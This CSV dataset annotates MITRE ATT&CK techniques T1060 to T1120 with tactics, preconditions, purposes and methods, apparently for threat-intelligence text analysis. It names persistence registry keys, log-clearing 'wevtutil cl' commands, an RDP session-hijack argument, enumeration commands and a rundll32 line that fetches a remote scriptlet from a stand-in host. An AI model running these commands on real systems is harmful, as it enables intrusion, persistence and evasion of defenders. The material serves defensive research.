0,1,3,2,tactic,technique,Id,action_what,action_where,where_attribute,when,when_condition,when_object,why_state,why_what,why_where,how,how_what,how_where,precondition,postcondition,alternative_technique,
,,,518,persistence,registry run keys / startup folder,t1060,add-entry/add-value/create,Run registry key/RunOnce Registry key/RunOnceEx Registry key/User Shell Folders Registry key/Shell Folders Registry key/RunServicesOnce Registry key/RunServices Registry key/Userinit Registry key,,,,,"<what>execute<\what> <where>malware<\where>, such as <where>remote access tools<\where>, <what>maintain<\what>persistence through system reboots",execute ;maintain,malwarel/remote access tool;persistence,<what>use<\what> masquerading; modiy/create HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run; HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce ;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run ;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce; HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx; HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend ; HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders ;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders ;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders ;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders; HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce; HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce ;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices ;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices; HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run ; HKEY_LOCAL_MACHINE\Software\Microsoft\Windows ; NT\CurrentVersion\Winlogon\Userinit ; HKEY_LOCAL_MACHINE\Software\Microsoft\Windows ; NT\CurrentVersion\Winlogon\ShellHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run; HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows,use;modify/create,masquerading; HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run/ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce/ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx/ HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders /HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders /HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders /HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders/HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce/HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices / HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices/HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /HKEY_LOCAL_MACHINE\Software\Microsoft\Windows /NT\CurrentVersion\Winlogon\Userinit / HKEY_LOCAL_MACHINE\Software\Microsoft\Windows /NT\CurrentVersion\Winlogon\ShellHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run / HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows,,,,
,,,260,execution,graphical user interface,t1061,use,system gui,,,,,<what> search <\what> for <where> information <\where> <what> execute <\what> <where>files <\where>,search/execute,information/file,"remote interactive session such as remote desktop protocol<where> mouse double-click events <\where>, the <where> windows run command <\where>",use,remote desktop protocol technique/remote interactive session technique/mouse double-click events/windows run command,,,,
,,,278,persistence,hypervisor,t1062,use,hypervisor,,Rootkit functionality exist,,,hide its existence; persist on systems,hide;persist,existence;system,interruption,,interruption,,,,
,,,577,discovery,security software discovery,t1063,get-list,security software/configuration/defensive tool/sensor,,,,,"get a listing of security software, configurations, defensive tools, and sensors that are installed on the system , <what>obtain<\what> <where>security software information<\where>",obtain,security software information,,use,netsh/ reg query with reg /dir with cmd / tasklist,,,,
,,,576,"defense evasion,execution",scripting,t1064,embed-script/embed-macro,office document,inside office documents ,"<condition><object>macros<\object> being allowed<\condition> , user will <condition>accept to activate <\condition>them","<object>macros<\object> being allowed , <object>macros<\object> being allowed , accept to activate","macros , macros",execute file,execute,file,,,,Spearphishing Attachment,,,
,,,570,"defense evasion,execution",scripting,t1064,use,script/scripting language/vbscript/powershell/command-line batch script,,,,,aid in operations and perform multiple actions that would otherwise be manual; reduce time required to gain access,aid ; perform;bypass,operation;action;process monitoring mechanism,interact with operating system at api level; use metasploit/veil/powersploit,interact;,operating system at API label; metasploit/veil/powersploit,,,,
,,,576,"defense evasion,execution",scripting,t1064,use,VBScript/poweshell script/command line batch script/metasploit/veil/powersploit/VBE/VBS/BAT/Javascript,,,,,execute file,execute/download/launch,file/payload,,,,Spearphishing Attachment,,,
,1,,97,command and control,uncommonly used port,t1065,conduct/communicate/send,c2 communication/C2 traffic,,that have been <condition>improperly configured<\condition>,improperly configured,firewall,<what>bypass<\what> <where>proxies<\where> and <where>firewalls<\where>,bypass,proxy; firewall,using uncommonly used port,use,uncommonly used port; not commonly used port,System-compromised,,uncommon-port-used,
,,,286,defense evasion,indicator removal from tools,t1066,modify,tool,malicious,,,,removing the indicator,remove,indicator,use software packing technique; modifying file;using updated version,use;modify,software packing technique/updated version; file,,,,
,,,61,persistence,bootkit,t1067,modify/overwrite,boot sector/mbr/vbr/master boot record /volume boot record,,has raw access to the boot drive,,,persist on systems;<what> diverting <\what><where> execution <\where>,persist;divert,system;execution,using bootkit,use,bootkit,,,,
,,,220,privilege escalation,exploitation for privilege escalation,t1068,use/abuse/take advantage,programming error/software vulnerability,"program, service,operating system software,kernel",have prior knowledge,,,<what> execute <\what> <where> adversary-controlled code <\where>;escalate privileges,execute;escalate,adversary-controlled code;privilege,exploit CVE,exploit,CVE,,,,
,,,455,discovery,permission groups discovery,t1069,find/search,local system/domain-level group/permission setting,,,,,,enumerate,permission/permission group,,use,net group /domain;net localgroup;dscacheutil -q group;dscl . -list /groups;groups;ldapsearch,,,,
,,,290,defense evasion,indicator removal on host,t1070,delete/alter/clear/remove,artifact/log/event log/event,,,,,make forensic analysis and incident response more difficult;causing events to go unreported,make-difficult; cause-unreported,forensic analysis and incident response; event,"using powershell command;wevtutil cl system
;wevtutil cl application;
wevtutil cl security",use,"powershell command;wevtutil cl system
;wevtutil cl application;
wevtutil cl security",,,,
,1,,660,command and control,standard application layer protocol,t1071,blend-command/ embed-command/ communicate/send,traffic/ c2 traffic,existing,machine is-a compromised,,,avoid detection,avoid,detection,"using a common, standardized application layer protocol ,using http ,using https ,using smtp ,usingdns",use,common/standardized application layer protocol/ http/https /smtp / dns,C2-Channel-established,,application-layer-protocol-used,
,,,711,"execution,lateral movement",third-party software,t1072,use,third-party software/third-party application,,adversary has-a access to third-party-software; login required,access,third-party-software,remote code execution; move laterally to system;wipe hard-drive,remote-execute;move-laterally;wipe,code;remote-system;hard-drive,using third-party-software/SCCM/VNC/HBSS/Altiris,use,third-party-software/SCCM/VNC/HBSS/Altiris,third-party-software-access-granted,,remote-code-executed,
,,,177,defense evasion,dll side-loading,t1073,use,dll side-loading vulnerability,,Windows Side-by-Side (WinSxS) manifests [1] are not explicit enough ,,,"masking actions they perform under a legitimate, trusted system or software process; load malicious dll",mask;load,action;dll,,,,,,,
,1,,157,collection,data staged,t1074,stage/keep/combine/copy/store,data/file,compressed data/encrypted data,,,,Exfiltrate data/file,Exfiltrate,data/file,"use cmd, use bash",use,Interactive command shell/cmd/bash/ Data Compressed technique/ Data Encrypted technique,<List all techniques that allow for data collection> AND location-access,new compressed/encrypted data/files stored in disk,new compressed/encrypted data/files stored in disk,
,,,436,lateral movement,pass the hash,t1075,use,password-hash/hash,,Hash is-a captured,captured,hash,authenticate user; bypass authentication steps,authenticate; bypass,user; authentication-step,capture hash through credential access technique,capture-hash,credential access technique,captured-hash-exist,,authentication-succeeded,
,,,535,lateral movement,remote desktop protocol,t1076,connect,remote-system,,RDP-service is-a enabled; credential is-a known,enabled;known,RDP-service;credential,move laterally to system,move-laterally,system,using credential access technique; using RDP/RDS,use,credential-access-technique/RDP/RDS,RDP-Service-enabled;credential-known,Accessibility Features,login-succeeded,
,,,539,lateral movement,remote desktop protocol,t1076,steal/hijack,rdp-session,,System-permission is-a granted,granted,system-permission,move laterally to system,move-laterally,system,using command line arguments: c:\windows\system32\tscon.exe [session number to be stolen],use,command-line-argument,RDP-Service-enabled,Remote system discovery,RDP-session-compromised,
,,,768,lateral movemnet,windows admin shares,t1077,transfer-file/transfer-binary/copy-file/copy-binary,Windows-admin-share,,Adversary has-a authenticated-session,authenticated-session,session,move laterally to system,move-laterally,system,"using SMB/RPC/net-utility; using  remote-execution , scheduled-task , service-execution , windows-management-instrumentation / use ntlm-hash",use,SMB/RPC/net-utility/remote-execution/scheduled-task/service-execution /windows-management-instrumentation/ntlm-hash/net use,valid-account-known;credential-known;SMB-enabled,,remote-file-copied,
1,,,745,"defense evasion,persistence,privilege escalation,initial access",valid accounts,t1078,steal/capture,user credential/  service account credential, ,,,,"gain access;
gain remote access;
gain persistance access;
bypass access controls
",gain;bypass,access/remote access/persistence access; access control,using credential access techniques;using social engineering,use,credential access techniques/social engineering,credential-captured,credential access technique;social engineering,credential-captured,
,,,746,"defense evasion,persistence,privilege escalation,initial access",valid accounts,t1078,use/utilize,credential/private key,compromised/stolen/publicly disclosed,,,,"connect to remote environments
",connect,remote environment,via Remote Service,,remote service,credential-captured,Remote service,access-previlidged,
,1,,382,command and control,multilayer encryption,t1079,perform/communicate/send,c2 communication/c2 traffic,,machine is-a compromised,,,,,,"using multiple layers of encryption , tunneling a custom encryption scheme within a protocol encryption scheme",use;tunnel custom encryption scheme,multilayer-encryption;protocol encryption scheme; multiple-encryption,encryption-utility-access,,traffic-encrypted,
,,,701,lateral movement,taint shared content,t1080,add-program/add-script/add-code,shared-location-file/network-drive-file,valid,adversary has-a opened file,opened,file,execute-code on remote-system,execute-code,remote-system,usign shortcut modification; using masquerading;using hidden file and directories,use,shortcut-modification/masquerading/hidden-file-and-directories,write-access-granted,,code-executed,
,1,,140,credential access,credential in files,t1081,search/extract/steal/locate,local file system/remote file share/password-in-file/credential-in-file,,files containing passwords,,,obtain/get,password,,<tech> credential dumping <\tech>group policy preferences stored on the windows domain controller,use,credential dumping;group policy preference,,,,
,,,681,discovery,system information discovery,t1082,obtain-information/get-information,operating system/hardware/operating system version/operating system patches/operating system hotfixes/service packs/hardware architecture,,,,,,get/identfy/acquire,information based on file directories,,use,ver utility/systeminfo utility / dir utility,,,,
,,,239,discovery,file and directory discovery,t1083,enumerate,file/directory,,,,,automated discovery,"gather-information ,interact","file/directory,windows api",,use,dir/tree; ls/find/locatecommands,,,,
,,,240,discovery,file and directory discovery,t1083,search-file,network share/host location,,,,,automated discovery,"gather-information ,interact","file/directory,windows api",,use,dir/tree; ls/find/locatecommands,,,,
,,,778,persistence,windows management instrumentation event subscription,t1084,compile-wmi-script,Windows Management Object  file/.mof file,,,,,adversaries may attempt to <why><what>evade<\what> detection,evade,detection,,use,wmi,,,,
,,,775,persistence,windows management instrumentation event subscription,t1084,use,wmi script,,,,,"<what>subscribe<\what> to an <where>event<\where> , execute arbitrary <where>code<\where><why> when <when> that <object>event<\object> occurs<\when>, providing persistence on a system. adversaries may attempt to <why><what>evade<\what> detection",subscribe;execute;evade,event ; code;detection,,use,wmi,,,,
,,,562,"defense evasion,execution",rundll32,t1085,execute,script/javascript/control panel item file/.cpl,,,,,avoid triggering security tool;proxy execute of code,avoid trigger;proxy execute,security tool;code,"use rundll32.exe; use shell32.dll function Control_RunDLL ; use shell32.dll function Control_RunDLLAsUser; rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""",use,"rundll32.exe; shell32.dll function Control_RunDLL ;   shell32.dll function Control_RunDLLAsUser; rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""",,,,
,,,466,execution,poweshell,t1086,use,powershell,,<object> administrator permissions <\object> are <condition> required <\condition>,required,administrator permissions,"<what> perform <\what> a number of <where> actions <\where>, including <what> discovery<\what> of <where> information <\where> and <what> execution <\what> of <where> code <\where>;download/run executable/command/script",perform;discovery ;execute/download/run,action;information;code; executable/command/script,<where> start-process cmdlet <\where> which can be used to <what> run <\what> an executable and the <where> invoke-command cmdlet <\where> which <what> runs <\what> a <attribute> command locally or on a remote computer <\attribute>,run,start-process cmdlet/invoke-command cmdlet/powershell.exe/Empire/PowerSploit/PSAttack/System.Management.Automation assembly /Windows Common Language Interface (CLI),,,,
,,,18,discovery,account discovery,t1087,get-list,local system account/domain account,,user is-a primary user/user has-a loggeed in,,,,enumerate,groups/users,,use/acquire-information,"net utility/net user/net group /net localgroup/""dscl . list /groups ""/ dscacheutil -q group/ ""/etc/passwd""/ ""groups/id""/Azure CLI /Get-MsolRoleMember PowerShell cmdlet/Get-GlobalAddressList PowerShell cmdlet/az ad user list",,,,
,,,81,"privilege escalation,defense evasion",bypass user account control,t1088,bypass,user account control/UAC,,<object> credentials<\object> for an account with <condition> administrator privileges are known<\condition>,administrator privileges are known,credentials,perform a task under administrator-level permission,perform,task under administrator-level permission without promting user,use of rundll32 technique; inject software into a trusted process;use eventvwr.exe,use;inject-software/inject-process,rundll32 technique/eventvwr.exe;trusted-process,,,,
,,,165,defense evasion,disabling security tools,t1089,disable/kill/terminate/delete,security tool/security software/event logging process/registry key,,,,,avoid possible detection of their tools and activities/tools; do not start at run time to interfere with security scanning or event reporting,avoid detection,security tool,"<what> killing <\what> <where> security software <\where> or <what>log<\where> <where> event processes <\where> logging processes, <what> deleting <\what> <where> registry keys <\where>",kill;delete,security software/logging process;registry keys,,,,
,,,113,command and control,connection proxy,t1090,perform/communicate/send,c2 communication/c2 traffic,,machine is-a compromised,,,<what> manage <\what><where>command and control communications<\where> . <what> reduce <\what> the number of simultaneous <attribute> outbound <\attribute> <where> network connections<\where> . <what> provide resiliency<\what>in the face of <where> connection loss<\where>ride over existing trusted communications paths between victims avoid suspicion,"manage,reduce,provide resiliency","command and control communications ,network connections ,connection loss","using proxy/using port redirection/using HTRAN,ZXProxy,ZXPortMap",use,proxy/port redirection/HTRAN/ZXProxy/ZXPortMsp/SOCKS5/SOCKS,C2-Channel-established,,traffic-redirected(??),
,,,382,"initial access,lateral movement",replication through removable media,t1091,copy-malware-to/move-code-to,removable media/USB,,Autorun enabled; removable-media allowed,"enabled, exist/allowed","autorun, removable media",execute code,execute,code,"copying malware, renaming /
 manual manipulation of the media / 
 format the media /
 modification to the media's firmware itself.",modify/format/manipulate;rename;use,media/media firmware/executable file;malware file;autorun feature,"external-media-allowed,
 autorun-enabled","code-executed, 
 initial-access/lateral-movement","code-executed, 
 initial-access/lateral-movement",
,1,,99,command and control,communication through removable media,t1092,perform/communicate/send/relay,c2 communication/c2 traffic/C2 command,,<object> systems <\object> would need to be <condition> compromised <\condition>,compromised; direct access,systems,transfer commands from system to system,transfer,command,removable media;lateral movement by replication through removable media,use,removable-media/replication-through-removable-media technique,System-compromised; removable-media-enabled;autorun-enabled,replication through removable media,command-transferred,
,,,482,defense evasion,process hollowing,t1093,"create , unmapp,replace","process ,memory,memory",suspended state ; ;malicious code,,,,"<what>evade<\what> <where>defenses and detection analysis<\where>;<why-1> <what> decrypt <\what> an <where> attachment <\where>, such as a <attribute> zip file password <\attribute> <\why-1>, in order to <why-2> <what> evade <\what> <attribute> email boundary <\attribute> <where> defenses <\where> <why-2>",evade,defenses / detection analysis,using process hollowing,use,process hollowing,,,,
,,,,defense evasion,process hollowing,t1093,mask,code execution,,,,,"<what>evade<\what> <where>defenses and detection analysis<\where>;<why-1> <what> decrypt <\what> an <where> attachment <\where>, such as a <attribute> zip file password <\attribute> <\why-1>, in order to <why-2> <what> evade <\what> <attribute> email boundary <\attribute> <where> defenses <\where> <why-2>",evade,defenses / detection analysis,using process hollowing,use,process hollowing,,,,
,1,,146,command and control,custom command and control protocol,t1094,communicate/send/encapsulate,c2 communication/c2 traffic,,,,,hide communications,hide,c2 communication,using custom command and control protocol;mimicking well-known protocols ;developing custom protocol,use;mimick;develop,custom command and control protocol; well-known protocol;custom protocol,C2-Channel-established,,non-standard-protocol-used,
,1,,664,command and control,standard non-application layer protocol,t1095,perform/communicate/send,c2 communication/c2 traffic,,,,,hide communications,hide,c2 communication,"use of a standard non-application layer protocol , use of network layer protocols, such as the internet control message protocol (icmp) , , transport layer protocols, such as the user datagram protocol (udp), ,session layer protocols, such as socket sec",use,standard non-application layer protocol/internet control message protocol (icmp)/transport layer protocol/user datagram protocol/session layer protocol,C2-Channel-established,,non-application-layer-protocol-used,
,,,401,defense evasion,ntfs file attributes,t1096,store-data/store-binary,file attribute metadata,,,,,"<what>evade<\what> some <where>defenses<\where>, such as <where>static indicator scanning tools<\where> and <where>anti-virus<\where>",evade,defenses /static indicator scanning tools/anti-virus,using file attribute/EA/ADS of master file table/MFT,use, file attribute/EA/ADS/master file table/MFT,,,,
,,,440,lateral movement,pass the ticket,t1097,use,kerberos-authentication/kerberos-ticket/service-ticket/ticket-granting-ticket/tgt/silver-ticket/golden-ticket,,ticket has-a captured,captured,ticket,move laterally to system,move-laterraly,system,using credential dumping,use,credential-dumping,captured-ticket-exist,,authentication-succeeded,
,,,23,"persistence,credential access",account manipulation,t1098,modify/add/change/set,permission/credential/permission-group/account-setting/authentication-procedure/second-password,,already have sufficient permissions on system,,,maintaining access to credentials and certain permission level,maintain-access,credential/permission level,,,,,,,
,,,722,defense evasion,timestomp,t1099,modify,timestamp of a file/ modify time of a file/ access time of a file/ create time of a file/ change time of a file,,,,,"<what>mimic<\what> <where>files<\where> that are in the same folder , they <what>do not appear conspicuous<\what> to <where>forensic investigators<\where> or <where>file analysis tools<\where>; hide malware and tool",mimic ; do not appear conspicuous; hide,file ; forensic investigator/file analysis tool;malware/tool,using Masquerading  technique,use,Masquerading  technique,,,,
,,,766,"persistence ,privilege escalation",web shell,t1100,place/install,web script/web shell,on web server,,,,"<what>use<\what> the <where>web server<\where> as a gateway into a network; 
for reduant access; persistance",use,web server as gateway; redundant access;persistance,,,,,redundant access,,
,,,579,persistence,security support provider,t1101,modify, security support provider registry key,,,,,<what>add<\what> new <where>ssps<\where>,add,ssps,modifying hklm\system\currentcontrolset\control\lsa\security packages ; modify hklm\system\currentcontrolset\control\lsa\osconfig\security packages,modify,hklm\system\currentcontrolset\control\lsa\security packages ; hklm\system\currentcontrolset\control\lsa\osconfig\security packages,,,,
,1,,765,command and control,web service,t1102,use,web service/common service,"existing/legitimate external,offered by google or twitter",once <condition>infected<\condition>,infected/compromised,system,relaying commands to a compromised system;hide in expected noise,relay/hide,C2 command,"post content, known as a dead drop resolver on web services with embedded (and often obfuscated/encoded) domains or ip addresses",post,dead-drop-resolver,System-compromised,,traffic-redirected(??),
,,,30,"persistence,privilege escalation",appinit dlls,t1103,create/overwrite/modify,appinit dll registry key,,,,,obtain persistence and privilege escalation,obtain;escalate,persistence;privilege,by loading user32.dll,load;modify,user32.dll;hkey_local_machine\software\microsoft\windows nt\currentversion\windows; hkey_local_machine\software\wow6432node\microsoft\windows nt\currentversion\windows ,,,,
,1,,383,command and control,Multi-Stage Channels,t1104,use,muli-stage channel,,,,,"collect basic host information, update tools, and upload additional files; 
 redirect the host to the second-stage command and control server",collect; update;upload; redirect,host information; tool;file; host,use remote access tool;creating multi stage channel,use;create,remote access tool;multi stage channel,System-compromised,Fallback channel,C2-channel-switched,
,1,,541,"Command And Control, Lateral Movement",remote file copy,t1105,copy,file,,C2-Channel is-a established,,,stage adversary tools or other files;bring tools into the victim network,stage; bring-tool,adversary tool; victim-network,using command and control channel; using alternate protocol with another tool/ftp; using native tools/scp/ rsync/sftp;using inherent file sharing protocol/file sharing over smb; using windows admin shares/remote desktop protocol,use,command-and-control-channel/ftp/scp/rsync/sftp/smb/windows-admin-share/remote-desktop-protocol,"C2-Channel-established,File-identified",Windows admin share/Remote desktop protocol,File-written,
,,,203,execution,execution through api,t1106,use,windows application programming interface /api,,,,,<what> execute <\what><where> binaries <\where>,execute,binaries,"use CreateProcess() API/CreateProcessA() API/ CreateProcessW() API/
CreateProcessAsUserA() API/ CreateProcessAsUserW() API/
CreateProcessInternalA() API/CreateProcessInternalW() API/
CreateProcessWithLogonW() API/CreateProcessWithTokenW() API/
LoadLibraryA() API/LoadLibraryW() API/
LoadLibraryExA() API/ LoadLibraryExW() API/
LoadModule() API/
LoadPackagedLibrary() API/
WinExec() API/
ShellExecuteA() API/ShellExecuteW() API/
ShellExecuteExA() API/ ShellExecuteExW() API",use,"CreateProcess() API/CreateProcessA() API/ CreateProcessW() API/
CreateProcessAsUserA() API/ CreateProcessAsUserW() API/
CreateProcessInternalA() API/CreateProcessInternalW() API/
CreateProcessWithLogonW() API/CreateProcessWithTokenW() API/
LoadLibraryA() API/LoadLibraryW() API/
LoadLibraryExA() API/ LoadLibraryExW() API/
LoadModule() API/
LoadPackagedLibrary() API/
WinExec() API/
ShellExecuteA() API/ShellExecuteW() API/
ShellExecuteExA() API/ ShellExecuteExW() API",,,,
,,,242,defense evasion,file deletion,t1107,remove/delete,file,,file dropped by adversary,,,keep their footprint lower;move them at the end as part of the post-intrusion cleanup process,keep low,adversary footprint,use del/secure deletion tools / windows sysinternals sdelete/ third-party file deletion tool/native cmd,use,del/secure deletion tools / windows sysinternals sdelete/ third-party file deletion tool/native cmd,,,,
,,,515,"defense evasion,persistence",redundant access,t1108,use,remote access tool,more than one,,,,retain access to the network;maintain access despite interruption; gain access to Valid Accounts to use External Remote Services ,retain/maintain;gain-access;use,access;Valid Account technique;External Remote Services technique,<what>varying<\what> <where>command and control protocols<\where>;credentialed access to remote service; through cloud-based infrastructure and application; Use of a Web Shell technique,vary;credentialed access;use,command and control protocol;remote service;cloud-based infrastructure/cloud-based-application/Web Shell technique,,Valid Accounts;External Remote Services,,
,,,107,"persistence,defense evasion",component firmware,t1109,overwrite/install,firmware,,,,,"execute adversary code outside of the operating system,main system firmware or bios; provide both a persistent level of access to system;evade host software-based defenses and integrity check",execute;maintain;evade,code;persistence; host software-based defenses / integrity check,compromising device firmware,compromise,device firmware,,,,
,,,75,credential access,brute force,t1110,use,rainbow table,pre-computed,,,,<what> crack <\what> <where>hashes<\where>,crack,hashes,use brute force technique,use,brute force technique,,,,
,,,72,credential access,brute force,t1110,use/perform,brute force technique,,<object> passwords <\object> are <condition> unknown <\condition><object> password hashes <\object> are <condition> obtained <\condition>,"unknown,obtained","passwords,password hashes",attempt access to accounts;avoid account lockout,access;avoid,account; account lockout,using credential dumping technique; using pass the hash technique;use password spraying technique; guessing the password,use; guess,credential dumping technique/ password spraying technique/pass the hash technique;  password,,,,
,,,77,credential access,brute force,t1110,use/perform,password spraying,,,,,<what> crack <\what> <where>hashes<\where>,crack,hashes,using management service over commonly used port,use,management service ;commonly used port,,,,
,,,739,credential access,two-factor authentication interception,t1111,connect,network resource,, password is known,known,password,proxy the authentication,proxy,authentication,using inserted hardware token,use,inserted hardware token,credential-protected,credential-exposed,credential-exposed,
,,,742,credential access,two-factor authentication interception,t1111,replay/capture,one time password/token input,,Algorithm/seed value is known, known,Algorithm/seed ,"provide temporary access , predict future authentication value",provide/predict,temporary authentication value,using keylogger,use,keylogger,key-unknown,key-collected,key-collected,
,,,735,credential access,two-factor authentication interception,t1111,use/employ,keylogger,rsa securid,smart cardis used for two-factor authentication ,smart card is used for two-factor authentication,smart card,"intercept and bypass these security mechanisms, gain access to systems, services, and network resources , obtain the password ",intercept/bypass ;gain access; obtain,security mechanism; system/ service/ network resources;password,,,,credential-protected,credential-exposed,credential-exposed,
,,,358,defense evasion,modify registry,t1112,interact/modify,windows registry,,"access to specific areas of the registry depends on <condition>account permissions<\condition>, some requiring <condition>administrator-level access<\condition>",account permission;remote registry service running; valid account required; Access to windows Admin share required,,"<what>hide <\what> <where>configuration information<\where> within registry keys , <what>remove<\what> <where>information<\where> as part of cleaning up , aid in persistence and execution;conceal payloads/command",hide/ remove;aid in;conceal,configuration information ;information;persistence/execution;payload/command,using built-in Windows command-line utility Reg/remote access tool; prepending keyname with null character,use;prepend-keyname,built-in Windows command-line utility Reg/remote access tool;null character,,,,
,1,,567,collection,screen capture,t1113,take/capture,screen/screen-capture/screenshot,,,,,gather information; capture screenshots,gather /capture,information/screenshot,,use,native command screencapture/xwd/remote access tool,command-access,screen-captured,screen-captured,
,1,,197,collection,email collection,t1114,acquire/discover/collect,email-data/email-address,,machine is-a compromise; adversary has-a credential,,,"collect sensitive information;interact with exchange server, acquire information",collect/acquire;interact,information;exchange server,accessing Outlook storage; searching cache files .pst and .ost;access-webmail application/outlook web access;creating email forwarding rule,access;search;create,Outlook storage/webmail application/outlook web access; cache files/ .pst / .ost;webmail application/outlook web access; email forwarding rule,"email-servcer-access, credential-access",spear-phishing,mailserver-access or emailclient-access,
,1,,86,collection,clipboard data,t1115,collect/access/read,clipboard data,stored in the windows clipboard,,,,<what> grab <\what> <where> clipboard contents <\where>,grab,clipboard contents,,use,pbpaste/windows api,information-copied,exfiltration,cliboard-access,
,,,91,defense evasion,code signing,t1116,use,code signing certificate,,,,,masquerade malware and tools as legitimate binaries; bypass security policy,masquerade;bypass,malware/toos as legitimate;security policy,by create/forge/steal certificate,create/forge/steal ,certificate,,,,
,,,530,"defense evasion,execution",regsvr32,t1117,load,script/COM scriplet,,,,,execute dll;bypass process whitelisting,execute;bypass,dll;process whitelisitng,passing/sending a uniform resource locator (url)  to file on an external web server as an argument during invocation; use regsvr32.exe,pass/send;use,url/uniform resource locator;regsvr32.exe,,,,
,,,524,"defense evasion,execution",regsvr32,t1117,register/unregister,object link/embedding control/dll/com object,,,,,proxy execution of code; avoid triggering security tool; establish persistence,proxy-execute ;avoid trigger; establish,code; security tool;persistence,using regsvr32; using Component Object Model Hijacking,using,regsvr32.exe/Component Object Model Hijacking,,,,
,,,314,defense evasion,install util,t1118,use,installutil,,,,,<what> proxy execution <\what> of <where> code <\where>;<what> bypass <\what> <where> process whitelisting <\where>,proxy execution;bypass,code;process whitelisting,through trusted windows utility;through use of attributes within the binary,use,trusted windows utility;attributes within the binary;[System.ComponentModel.RunInstaller(true)],,,,
,1,,52,collection,automated collection,t1119,collect/search/copy/move/identify,data/information/file type/location/name,,<condition> established <\condition> within a <object> system or network <\object>,established,system or network,gather information,gather,information,,use,Scripting/File and Directory Discovery/Remote file Copy,file-access/directory-access,file-collected/data-collected,file-collected/data-collected,
,,,453,discovery,peripheral device discovery,t1120,gather-information/get-list,peripheral device/connected computer,,,,,,enhance-awareness,system/network,,,,,,,
